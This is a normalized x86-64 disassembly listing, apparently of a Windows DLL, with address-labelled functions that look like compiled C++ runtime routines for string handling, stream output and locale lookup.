mov rsi rdx
mov rbx rcx
cmp rax rdx
ja r-xdata
mov [ rsp + 0x30 ] rdi
test rdx rdx
je r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rdx ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_180007580
test rdi rdi
je r-xdata
mov rcx [ rbx + 0x10 ]
cmp rsi 0x1
jne r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rcx ] bpl
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rcx ] bpl
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
movsx edx bpl
add rcx rax
mov r8 rsi
call sub_180021150
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_18000d2a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
mov [ rsp + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
movzx r14d [ rsp + 0xa8 ]
mov r13 [ rsp + 0xa0 ]
movaps [ rsp + 0x40 ] xmm6
mov r12 r9
mov r15 r8
nop [ rax ] eax
mov rbp r13
sub rbp r12
jmp r-xdata
add r12 rbp
sub r13 rbp
movups [ r15 ] xmm6
je r-xdata
test rbx rbx
je r-xdata
movups xmm6 [ r15 ]
mov rdi rbp
mov rsi r12
movaps [ rsp + 0x20 ] xmm6
mov rbx [ rsp + 0x28 ]
test rbp rbp
je r-xdata
mov rax [ rsp + 0x88 ]
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
movups [ rax ] xmm6
movaps xmm6 [ rsp + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test r14b r14b
je r-xdata
mov [ rsp + 0x20 ] 0x1
mov rax [ rbx + 0x48 ]
movzx r8d [ rsi ]
cmp [ rax ] 0x0
je r-xdata
inc r12
dec r13
jmp r-xdata
movaps [ rsp + 0x30 ] xmm6
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x20 ]
mov rax [ rbx ]
movzx edx r8b
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov r8 r13
xor edx edx
mov rcx r12
call sub_1800215e8
mov rbp rax
test rax rax
je r-xdata
mov [ rsp + 0x30 ] 0x1
movaps xmm6 [ rsp + 0x30 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
inc rsi
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
mov rax [ rbx ]
movzx edx r14b
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
movups [ r15 ] xmm6
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r14b
movzx eax r14b
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_18000d430
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001f9f0
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_18001fb7c
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001fa20
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_18000caf0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800204a8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
int3
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rcx rbx
call sub_18001faac
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_18000d580
mov rax rsp
push rdi
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rbp rdx
mov rdi rcx
xor esi esi
mov [ rsp + 0x80 ] esi
test rcx rcx
je r-xdata
mov eax 0x4
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
cmp [ rcx ] rsi
jne r-xdata
lea ecx [ rsi + 0x18 ]
call sub_180021000
mov rbx rax
mov [ rsp + 0x80 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_18000ca70
lea rcx [ rsp + 0x28 ]
call sub_18000c9d0
mov esi 0x1
mov [ rbx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
call sub_18001f944
mov [ rbx + 0x10 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rdi ] rbx
test sil 0x1
je r-xdata
sub_18000d660
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
call j_sub_18002094c
mov rcx [ rdi + 0x20 ]
call j_sub_18002094c
mov rcx [ rdi + 0x28 ]
call j_sub_18002094c
lea r11 [ r--data ]
mov [ rdi ] r11
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_18000d6f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx ]
mov rbx rcx
xor edi edi
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_18000ba70
or edx 0x4
sub_18000d760
push rbx
sub rsp 0x40
mov rbx rcx
mov [ rcx + 0x8 ] 0x0
mov ecx 0x18
call sub_180021000
test rax rax
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_180020424
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_1800210a4
int3
mov [ rbx ] rax
mov [ rax ] rax
mov rax [ rbx ]
mov [ rax + 0x8 ] rax
mov rax rbx
add rsp 0x40
pop rbx
retn
sub_18000d7d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rsi [ rcx - 0x98 ]
mov edi edx
lea rcx [ rsi + 0x98 ]
call sub_18000cbe0
lea rax [ r--data ]
lea rcx [ rsi + 0x98 ]
mov [ rsi + 0x98 ] rax
call sub_1800200a0
test dil 0x1
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rsi
call j_sub_18002094c#2
sub_18000d860
push rdi
sub rsp 0x50
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rsi
mov rbx r9
mov rdi r8
mov rsi rdx
mov ecx 0x18
call sub_180021000
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
call sub_180020424
lea r11 [ r--data ]
mov [ rsp + 0x30 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_1800210a4
int3
mov [ rax ] rsi
mov [ rax + 0x8 ] rdi
lea rdx [ rax + 0x10 ]
test rdx rdx
je r-xdata
jmp r-xdata
mov rcx [ rbx ]
mov [ rdx ] rcx
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
sub_18000d900
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
movzx ebp dl
lea rdx [ rsp + 0x68 ]
call sub_18000b790
nop
mov rcx rax
call sub_18000d430
mov rsi rax
mov rdi [ rsp + 0x68 ]
test rdi rdi
je r-xdata
mov rax [ rsi ]
movzx edx bpl
mov rcx rsi
call [ rax + 0x30 ]
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_18000d9a0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001f9f0
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_18001fb7c
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001fa20
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_18000d580
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800204a8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
int3
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rcx rbx
call sub_18001faac
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_18000daf0
mov rax rsp
push rbp
push rsi
push rdi
sub rsp 0x70
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov rbp rdx
mov rdi rcx
xor esi esi
mov [ rax + 0x8 ] esi
test rcx rcx
je r-xdata
mov eax 0x4
mov rbx [ rsp + 0x98 ]
add rsp 0x70
pop rdi
pop rsi
pop rbp
retn
cmp [ rcx ] rsi
jne r-xdata
lea ecx [ rsi + 0x30 ]
call sub_180021000
mov rbx rax
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_18000ca70
lea rcx [ rsp + 0x28 ]
call sub_18000c9d0
nop
mov esi 0x1
mov [ rsp + 0x90 ] esi
mov [ rbx + 0x8 ] 0x0
lea rcx [ r--data ]
mov [ rbx ] rcx
movzx r8d sil
mov rdx rax
mov rcx rbx
call sub_18000c890
nop
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rdi ] rbx
test sil 0x1
je r-xdata
sub_18000dbb0
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx rcx
call j_sub_1800241dc
test al al
jne r-xdata
mov rdx [ rbx ]
mov rax [ rdx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rdx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx [ rbx ]
call sub_18000d830
nop
add rsp 0x30
pop rbx
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_18000dc00
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x10 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180008110
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000dc50
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x20 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180008110
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000dca0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x28 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180008110
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_18000dcf0
push rbp
push rsi
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rbp rcx
xor edx edx
lea rcx [ rsp + 0x68 ]
call sub_18001f9f0
nop
mov rsi [ rw-data ]
mov [ rsp + 0x70 ] rsi
mov rdi [ rw-data ]
test rdi rdi
jne r-xdata
mov rcx [ rbp ]
cmp rdi [ rcx + 0x18 ]
jae r-xdata
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
cmp [ rw-data ] rdi
jne r-xdata
xor ebx ebx
mov rax [ rcx + 0x10 ]
mov rbx [ rax + rdi * 8 ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rdi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cdqe
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
call sub_18001fb7c
cmp rdi [ rax + 0x18 ]
jae r-xdata
lea rcx [ rsp + 0x68 ]
call sub_18001fa20
mov rax rbx
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
test rsi rsi
je r-xdata
mov rax [ rax + 0x10 ]
mov rbx [ rax + rdi * 8 ]
cmp [ rcx + 0x24 ] 0x0
je r-xdata
mov rdx rbp
lea rcx [ rsp + 0x70 ]
call sub_18000daf0
cmp rax 0xffffffffffffffff
jne r-xdata
mov rbx rsi
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x60 ]
call sub_18001f9f0
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800204a8
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_1800210a4
int3
lea rcx [ rsp + 0x60 ]
call sub_18001fa20
mov rcx rbx
call sub_18001faac
nop
inc rcx
mov [ rbx + 0x8 ] rcx
sub_18000de40
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rax r8
mov rbx rcx
sub rax rdx
sar rax 0x1
mov rdi [ rcx + 0x10 ]
cmp rdi rax
ja r-xdata
xor r12d r12d
nop [ rax ] eax
cmp [ rcx + 0x18 ] rax
je r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
movzx esi [ rdx ]
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax 0x1
ja r-xdata
mov r8b 0x1
mov rdx rax
call sub_1800078a0
test al al
je r-xdata
lea rdi [ r8 + 0x1 ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180007580
jmp r-xdata
mov [ rax + rdi ] 0x0
mov rcx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] r12
cmp rax 0x10
jb r-xdata
test rdi rdi
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add [ rsp + 0x58 ] 0x2
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx ] sil
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rax ] r12b
jmp r-xdata
mov rdx [ rsp + 0x58 ]
cmp rdx [ rsp + 0x60 ]
je r-xdata
mov [ rax + rdi ] r12b
sub_18000df80
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov rdi r9
mov rbx r8
mov rbp rdx
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] r9
xor esi esi
xor r12b r12b
nop [ rax + rax ] eax
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rax
mov rcx rbp
call sub_1800074e0
mov [ rsp + 0x20 ] 0xffffffffffffffff
xor r9d r9d
mov r8 rdi
mov rdx rsi
mov rcx rbp
call sub_180007c20
add rsi [ rdi + 0x10 ]
mov r12b 0x1
jmp r-xdata
mov r9 [ rbx + 0x10 ]
mov r8 rsi
mov rcx rbp
call sub_18000c680
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
cmp [ rdi + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rdi + 0x18 ] 0xf
mov [ rdi + 0x10 ] 0x0
mov [ rdi ] 0x0
movzx eax r12b
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rdi ]
call j_sub_18002094c#2
sub_18000e080
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
mov r14d edx
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_18000b790
nop
mov rcx rax
call sub_18000d9a0
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_18000d6f0
call j_sub_1800241dc
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] al
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x30 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001f9f0
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
mov rcx [ rcx + rbx + 0x48 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_18000d830
nop
xor r8d r8d
call sub_18000ba70
nop
or edx 0x4
mov rsi rdi
cmp [ r12 + 0x8 ] rdi
cmove rsi r12
lea rcx [ rsp + 0xb8 ]
call sub_18001fa20
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax rbx
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
nop
dec rax
mov [ r12 + 0x8 ] rax
sub_18000e260
push rdi
sub rsp 0x20
mov rax [ rcx ]
mov rdi rcx
mov rcx [ rax ]
mov [ rax ] rax
mov rax [ rdi ]
mov [ rax + 0x8 ] rax
mov [ rdi + 0x8 ] 0x0
cmp rcx [ rdi ]
je r-xdata
mov rcx [ rdi ]
add rsp 0x20
pop rdi
jmp j_sub_18002094c#2
mov [ rsp + 0x30 ] rbx
nop [ rax + rax ] eax
mov rbx [ rcx ]
call j_sub_18002094c#2
mov rcx rbx
cmp rbx [ rdi ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
sub_18000e2c0
mov rax rsp
push rbp
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rbx rdx
xor edi edi
mov [ rbp - 0x40 ] edi
mov eax [ rcx + 0x78 ]
test al 0x2
jne r-xdata
test al 0x4
jne r-xdata
mov rdx [ rcx + 0x48 ]
cmp [ rdx ] rdi
je r-xdata
mov [ rbp - 0x18 ] 0xf
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] dil
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] 0x0
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rdi
je r-xdata
mov rax [ rdx ]
mov r8 [ rcx + 0x70 ]
cmp r8 rax
cmovb r8 rax
mov rax [ rcx + 0x28 ]
mov rdx [ rax ]
mov [ rbp - 0x18 ] 0xf
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] dil
sub r8 rdx
lea rcx [ rbp - 0x30 ]
call sub_180008110
nop
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] dil
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax [ rcx + 0x58 ]
movsxd r8 [ rax ]
add r8 [ rdx ]
mov rax [ rcx + 0x20 ]
mov rdx [ rax ]
mov [ rbp - 0x18 ] 0xf
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] dil
sub r8 rdx
lea rcx [ rbp - 0x30 ]
call sub_180008110
nop
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] 0x0
lea rax [ rbp - 0x30 ]
cmp rbx rax
je r-xdata
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_18002094c#2
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rdi [ rbp - 0x18 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp rdi 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rax [ rbp - 0x30 ]
mov [ rbx ] rax
mov [ rbp - 0x30 ] rdi
mov r8 [ rbp - 0x20 ]
inc r8
lea rdx [ rbp - 0x30 ]
mov rcx rbx
call sub_1800205e0
mov rcx [ rbp - 0x18 ]
jmp r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rdi
mov [ rbx ] 0x0
mov rcx [ rbp - 0x18 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ rbx ]
